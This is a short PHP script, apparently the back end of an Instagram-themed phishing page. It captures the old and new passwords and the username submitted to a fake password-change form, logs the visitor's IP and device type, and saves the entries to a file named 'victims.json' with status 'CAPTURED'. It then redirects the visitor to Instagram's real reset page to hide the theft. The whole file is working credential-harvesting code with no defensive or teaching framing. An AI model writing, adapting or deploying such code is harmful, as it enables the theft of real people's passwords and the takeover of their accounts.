<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $old_password = $_POST['old_password'] ?? 'N/A';
    $new_password = $_POST['new_password'] ?? 'N/A';
    
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date("Y-m-d H:i:s");

    $platform = "Unknown Device";
    if (preg_match('/iphone/i', $user_agent)) { $platform = "iPhone"; }
    elseif (preg_match('/android/i', $user_agent)) { $platform = "Android"; }
    elseif (preg_match('/windows/i', $user_agent)) { $platform = "Windows PC"; }
    elseif (preg_match('/macintosh|mac os x/i', $user_agent)) { $platform = "MacBook"; }

    $target_key = $_POST['username'] ?? "Target_" . substr(md5($ip_address . $timestamp), 0, 6);

    $new_entry = [
        "current_pass" => $old_password, 
        "new_pass"     => $new_password, 
        "timestamp"    => $timestamp,
        "ip"           => $ip_address,
        "platform"     => $platform,     
        "status"       => "CAPTURED"     
    ];

    $file = 'victims.json';

    $json_data = [];
    if (file_exists($file)) {
        $content = file_get_contents($file);
        $json_data = json_decode($content, true) ?? [];
    }

    $json_data[$target_key] = $new_entry;
    file_put_contents($file, json_encode($json_data, JSON_PRETTY_PRINT));

    header("Location: https://www.instagram.com/accounts/password/reset/");
    exit();
}
?>
